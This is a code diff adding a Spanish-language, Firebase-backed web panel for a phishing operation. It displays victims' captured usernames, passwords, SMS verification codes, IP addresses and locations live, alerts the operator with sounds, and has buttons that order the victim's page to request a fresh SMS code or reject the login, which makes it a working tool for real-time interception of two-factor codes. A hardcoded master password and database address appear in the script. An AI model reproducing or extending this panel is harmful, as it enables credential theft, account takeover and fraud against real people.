@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>JS C0D3R - PANEL</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <style>
+        #admin-panel { display: none; }
+        #auth-screen { display: flex; }
+        .data-label { font-size: 10px; text-transform: uppercase; color: #9ca3af; font-weight: 700; margin-bottom: 2px; }
+        .data-value { font-weight: 600; word-break: break-all; margin-bottom: 8px; line-height: 1.2; }
+        .sms-pulse { animation: pulse-yellow 2s infinite; }
+        .reentry-pulse { animation: pulse-red 1.5s infinite; }
+        @keyframes pulse-yellow {
+            0%, 100% { background-color: #fef9c3; }
+            50% { background-color: #fde047; }
+        }
+        @keyframes pulse-red {
+            0%, 100% { background-color: #fee2e2; border-color: #ef4444; }
+            50% { background-color: #fecaca; border-color: #b91c1c; }
+        }
+    </style>
+</head>
+<body class="bg-gray-100">
+
+    <div id="auth-screen" class="fixed inset-0 bg-slate-900 flex items-center justify-center z-[100]">
+        <div class="bg-white p-8 rounded-2xl shadow-2xl w-96 text-center">
+            <h2 class="text-2xl font-bold mb-6 text-gray-800">🔐 Acceso Master</h2>
+            <input type="password" id="admin-pass" placeholder="Contraseña" 
+                   class="w-full p-3 border border-gray-300 rounded-lg mb-4 focus:outline-none focus:ring-2 focus:ring-indigo-500">
+            <button onclick="verificarAcceso()" 
+                    class="w-full bg-indigo-600 text-white font-bold py-3 rounded-lg hover:bg-indigo-700 transition">
+                Acceder al Panel
+            </button>
+            <p id="auth-error" class="text-red-500 text-sm mt-3 hidden">Credencial Inválida</p>
+        </div>
+    </div>
+
+    <div id="admin-panel">
+        <nav class="bg-indigo-800 p-4 text-white flex justify-between items-center shadow-lg sticky top-0 z-50">
+            <div class="flex items-center gap-4">
+                <h1 class="text-xl font-bold italic tracking-tighter">JS C0D3R - PANEL</h1>
+                <div class="text-xs bg-indigo-900 px-3 py-1 rounded-full text-indigo-200">
+                    Auto-refresco en: <span id="timer">10</span>s
+                </div>
+            </div>
+            <div class="flex items-center gap-4">
+                <div class="bg-indigo-700 px-4 py-2 rounded-lg font-mono text-sm">
+                    USUARIOS: <span id="total-count">0</span>
+                </div>
+                <button onclick="borrarTodo()" class="bg-rose-600 hover:bg-rose-700 px-4 py-2 rounded-lg text-sm font-bold transition">🗑️ Limpiar Todo</button>
+                <button onclick="cerrarSesion()" class="bg-gray-800 hover:bg-black px-4 py-2 rounded-lg text-sm font-bold transition">🚪 Salir</button>
+            </div>
+        </nav>
+        <div class="max-w-7xl mx-auto p-6">
+            <div id="users-container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"></div>
+        </div>
+    </div>
+
+    <audio id="notif-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
+
+    <script>
+        const CLAVE_MAESTRA = "Cabimas01"; 
+        const firebaseConfig = { databaseURL: "https://tucopedanm-default-rtdb.firebaseio.com/" };
+        
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        
+        let idsConocidos = new Set(); 
+        let ultimoSmsRegistrado = {}; 
+        let ultimaFechaLogin = {}; // Para detectar re-ingresos
+        let primeraCarga = true;
+
+        // Lógica de Auto-Refresh (10 segundos)
+        let countTimer = 10;
+        setInterval(() => {
+            countTimer--;
+            document.getElementById('timer').innerText = countTimer;
+            if (countTimer <= 0) {
+                location.reload();
+            }
+        }, 1000);
+
+        function sonarAlerta() {
+            const sound = document.getElementById('notif-sound');
+            if (sound) {
+                sound.currentTime = 0;
+                sound.play().catch(() => {});
+            }
+        }
+
+        function verificarAcceso() {
+            const pass = document.getElementById('admin-pass').value;
+            if (pass === CLAVE_MAESTRA) {
+                sessionStorage.setItem('admin_auth', 'true');
+                mostrarPanel();
+            } else {
+                document.getElementById('auth-error').classList.remove('hidden');
+            }
+        }
+
+        function mostrarPanel() {
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('admin-panel').style.display = 'block';
+            iniciarEscuchaFirebase();
+        }
+
+        function cerrarSesion() {
+            sessionStorage.removeItem('admin_auth');
+            location.reload();
+        }
+
+        if (sessionStorage.getItem('admin_auth') === 'true') {
+            mostrarPanel();
+        }
+
+        function iniciarEscuchaFirebase() {
+            db.ref('logins').on('value', (snapshot) => {
+                const container = document.getElementById('users-container');
+                container.innerHTML = ''; 
+                let count = 0;
+
+                snapshot.forEach((child) => {
+                    const id = child.key;
+                    const data = child.val();
+                    if (!data) return;
+                    count++;
+
+                    // --- DETECCIÓN DE EVENTOS ---
+                    
+                    // 1. Nuevo Usuario
+                    if (!idsConocidos.has(id)) {
+                        if (!primeraCarga) sonarAlerta();
+                        idsConocidos.add(id);
+                    }
+
+                    // 2. Nuevo SMS
+                    if (data.sms && ultimoSmsRegistrado[id] !== data.sms) {
+                        if (!primeraCarga) sonarAlerta();
+                        ultimoSmsRegistrado[id] = data.sms;
+                    }
+
+                    // 3. Re-ingreso de credenciales (si la fecha cambia)
+                    let avisoReingreso = "";
+                    if (ultimaFechaLogin[id] && ultimaFechaLogin[id] !== data.fecha) {
+                        avisoReingreso = `
+                            <div class="mt-2 p-2 rounded border-2 border-red-500 reentry-pulse text-red-700 text-[10px] font-black text-center">
+                                ⚠️ EL USUARIO VOLVIÓ A ENVIAR DATOS
+                            </div>`;
+                        if (!primeraCarga) sonarAlerta();
+                    }
+                    ultimaFechaLogin[id] = data.fecha;
+
+                    // 4. Cálculo de Actividad
+                    let actividad = "Indeterminado";
+                    let actividadColor = "text-gray-500";
+                    
+                    if (data.status === 'SMS_ENTREGADO') {
+                        actividad = "✅ CÓDIGO INGRESADO";
+                        actividadColor = "text-green-600";
+                    } else if (data.status === 'PENDIENTE_SMS') {
+                        actividad = "⏳ ESPERANDO SMS";
+                        actividadColor = "text-orange-500 font-bold";
+                    } else {
+                        actividad = "✍️ INGRESANDO CREDENCIALES";
+                    }
+
+                    const statusColor = data.online === true ? 'bg-green-500' : 'bg-red-500';
+
+                    container.innerHTML += `
+                        <div class="bg-white rounded-xl shadow-lg p-5 border-t-8 border-indigo-500 relative overflow-hidden">
+                            <div class="absolute top-2 right-2 flex items-center gap-1">
+                                <span class="h-2 w-2 rounded-full ${statusColor} animate-pulse"></span>
+                                <span class="text-[8px] font-bold text-gray-400">${data.online ? 'LIVE' : 'OFF'}</span>
+                            </div>
+                            
+                            <div class="mb-3">
+                                <div class="data-label">Estado actual:</div>
+                                <div class="text-xs font-bold ${actividadColor} uppercase">${actividad}</div>
+                            </div>
+
+                            ${avisoReingreso}
+
+                            <p class="text-[9px] text-gray-400 font-mono mb-3">ID: ${id}</p>
+                            
+                            <div class="space-y-1">
+                                <div class="flex justify-between border-b pb-1">
+                                    <span class="data-label">Usuario</span>
+                                    <span class="data-value text-blue-700">${data.username}</span>
+                                </div>
+                                <div class="space-y-1">
+                                <div class="flex justify-between border-b pb-1">
+                                    <span class="data-label">Contraseña</span>
+                                    <span class="data-value text-blue-700">${data.password}</span>
+                                </div>
+                            </div>
+
+                            ${data.sms ? `
+                                <div class="mt-4 p-3 rounded-lg border-2 border-yellow-500 bg-yellow-50 sms-pulse shadow-inner">
+                                    <div class="data-label text-yellow-800 text-center">📩 CÓDIGO RECIBIDO</div>
+                                    <div class="text-3xl font-black text-center tracking-[0.5em] text-gray-800">${data.sms}</div>
+                                </div>
+                            ` : ''}
+
+                            <div class="mt-4 grid grid-cols-2 gap-2">
+                                <div class="bg-gray-50 p-2 rounded">
+                                    <div class="data-label">Dirección IP</div>
+                                    <div class="text-[10px] font-mono text-gray-600">${data.ip || '0.0.0.0'}</div>
+                                </div>
+                                <div class="bg-gray-50 p-2 rounded">
+                                    <div class="data-label">Ubicación</div>
+                                    <div class="text-[10px] text-gray-600 truncate">${data.ubicacion || 'Desconocida'}</div>
+                                </div>
+                            </div>
+
+                            <div class="flex gap-2 mt-4">
+                                <button onclick="enviarOrden('${id}', 'pedir_codigo')" class="bg-amber-500 hover:bg-amber-600 text-white text-[10px] px-2 py-3 rounded-lg font-bold flex-1 shadow-sm">SOLICITAR SMS</button>
+                                <button onclick="enviarOrden('${id}', 'rechazar')" class="bg-slate-700 hover:bg-black text-white text-[10px] px-2 py-3 rounded-lg font-bold flex-1 shadow-sm">RECHAZAR</button>
+                            </div>
+                        </div>`;
+                });
+                document.getElementById('total-count').innerText = count;
+                primeraCarga = false;
+            });
+        }
+
+        function enviarOrden(id, accion) {
+            // Si pedimos código, limpiamos el campo SMS visualmente para esperar el nuevo
+            if (accion === 'pedir_codigo') {
+                db.ref('logins/' + id).update({ 
+                    status: 'PENDIENTE_SMS',
+                    sms: null 
+                });
+            }
+            db.ref('comandos/' + id).set({ accion: accion });
+        }
+
+        function borrarTodo() {
+            if (confirm('⚠️ ¿ESTÁS SEGURO? Se borrarán todos los registros de la base de datos.')) {
+                db.ref('logins').remove();
+                db.ref('comandos').remove();
+                location.reload();
+            }
+        }
+        function actualizarOTP(id) {
+    const codigo = document.getElementById(`otp-${id}`).value;
+    const tiempo = document.getElementById(`timer-${id}`).value || "01:30";
+
+    db.ref('logins/' + id).update({
+        codigo_app: codigo,
+        timer_app: tiempo,
+        intentos_app: 3
+    });
+
+    alert("Código actualizado correctamente");
+}
+    </script>
+</body>
+</html>
